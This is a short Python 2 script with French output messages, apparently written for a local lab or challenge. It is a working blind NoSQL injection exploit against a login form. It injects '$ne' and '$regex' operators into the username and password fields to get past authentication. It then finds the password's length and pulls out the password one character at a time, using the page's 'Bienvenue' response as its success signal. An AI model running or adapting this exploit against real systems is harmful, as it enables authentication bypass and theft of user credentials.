#!/usr/bin/env python2
# -*- coding: utf8 -*-
import requests

page = "http://localhost/NOSQL/"

taille=0
while 1:
     forge=".{"+str(taille)+"}";
     req={'usr_name[$ne]':'hacker', 'usr_password[$regex]':forge}
     resultat=requests.post(page,data=req).content
     print(req)
     if resultat.find(b'Bienvenue')==-1 :
          break
     taille+=1

taille-=1
print("[+] Le password fait "+str(taille)+" caracteres")
passwd=""
char=48

length=0

while length!=taille:
     forge=passwd+str(chr(char))+'.{'+str(taille-len(passwd)-1)+'}';
     req={'usr_name[$ne]':'hacker', 'usr_password[$regex]':forge}
     resultat=requests.post(page,data=req).content
     print(req)
     if resultat.find(b'Bienvenue')!=-1 :
          passwd+=str(chr(char))
          char=48
          length+=1
          print(passwd)

     if char==90:
          char=96
     if char==57:
          char=64
     char+=1

print("[+] Le password est: "+str(passwd))